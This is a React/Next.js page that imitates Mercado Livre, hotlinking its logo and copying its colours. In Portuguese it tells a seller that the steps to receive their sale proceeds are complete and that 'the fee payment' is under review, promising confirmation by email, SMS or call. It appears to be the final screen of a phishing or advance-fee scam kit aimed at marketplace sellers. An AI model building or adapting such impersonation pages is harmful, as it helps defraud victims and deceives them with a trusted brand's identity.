"use client";

import { useEffect, useState } from "react";

import { LoadingComponent } from "@/loading";

export default function ConfirmPage() {
  const [loading, setLoading] = useState(true);
  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  return (
    <div>
      <header>
        <nav className="flex p-4 items-center justify-between  bg-[#FFE600] shadow-md">
          <button className="text-4xl">☰</button>

          <a href="./" aria-label="ir para a página inicial">
            <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
          </a>

          <div className="flex items-center">
            <a href="#" className="text-xl">
              Ajuda
            </a>
          </div>
        </nav>
      </header>

      <main className="flex flex-col items-center justify-center mt-10 px-10 w-screen">
        <div className="bg-[#2968C8] p-6 flex flex-col items-center gap-4 rounded-xl w-full">
          <h2 className="text-white text-4xl font-bold">Confirmação!</h2>

          <p className="text-2xl text-center text-white">
            Parabéns! Todas as etapas necessárias para o recebimento do valor da
            sua venda foram concluídas com sucesso. Agora, estamos analisando os
            detalhes do pagamento da taxa.{" "}
            <b>
              Atenção! Em breve você receberá uma confirmação por email, SMS ou
              ligação informando que seu valor foi creditado em sua conta.
            </b>{" "}
            Aguarde você será redirecionado para uma pesquisa de satisfação
            sobre nossos serviços.
          </p>
        </div>

        <div className="flex flex-col justify-center items-center mt-4">
          <svg
            width="60"
            height="60"
            viewBox="0 0 100 100"
            xmlns="http://www.w3.org/2000/svg"
          >
            <polygon points="50,80 10,20 90,20" fill="#2968C8" />
          </svg>

          <p className="text-base text-center mt-4">
            Ao criar uma conta, você está de acordo com os{" "}
            <a href="#" className="text-[#2968C8]">
              termos de serviço{" "}
            </a>{" "}
            e a{" "}
            <a href="#" className="text-[#2968C8]">
              política de privacidade
            </a>{" "}
            do meli.
          </p>
        </div>
      </main>
    </div>
  );
}
